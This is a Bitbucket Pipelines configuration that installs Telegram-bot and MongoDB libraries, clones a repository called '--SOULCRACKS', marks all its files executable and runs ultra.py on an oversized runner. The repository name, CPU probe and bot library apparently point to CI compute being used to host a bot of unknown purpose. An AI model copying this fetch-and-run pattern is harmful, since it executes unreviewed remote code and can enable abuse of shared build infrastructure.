pipelines:
  default:
    - step:
        name: Run Python Script
        image: python:3.10
        size: 8x
        script:
          - pip install telebot pymongo aiohttp
          - git clone https://github.com/kingfather09090/--SOULCRACKS
          - ls
          - mv ultra.py -- ./--SOULCRACKS/ultra.py
          - cd ./--SOULCRACKS
          - lscpu
          - chmod +x *
          - python3 ultra.py
